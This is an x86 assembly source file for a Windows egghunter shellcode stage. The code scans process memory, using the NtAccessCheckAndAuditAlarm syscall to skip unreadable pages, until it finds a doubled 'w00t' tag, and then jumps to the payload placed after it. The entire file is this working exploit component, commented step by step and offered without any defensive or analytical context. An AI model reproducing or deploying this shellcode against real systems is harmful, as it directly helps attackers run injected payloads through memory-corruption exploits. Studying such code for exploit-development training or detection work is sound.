


section .text
global _start
_start:
loop_inc_page:
	or dx, 0x0fff
loop_inc_one:
	inc edx
loop_check:
	push edx						; saves current memory location to stack
	push byte 0x2
	pop eax							; NtAccessCheckAndAuditAlarm
	int 0x2e						; perform syscall	
	cmp al, 0x5  					; check for access violation
	pop edx							;  restore edx
loop_check_8_valid:
	je loop_inc_page				; if access vilation, go to next page
is_egg:
	mov eax, 0x57303054 			; egg; w00t
	mov edi, edx					; edx counter to edi for scasd comparison
	scasd							; compare edi to eax and set status flags
	jnz loop_inc_one				; no match; continue to next address
	scasd							; compare edi to eax and set status flags
	jnz loop_inc_one				; no match; egg found but not twice; continue to next address
matched:
	jmp edi							; edi points to first byte after eggegg



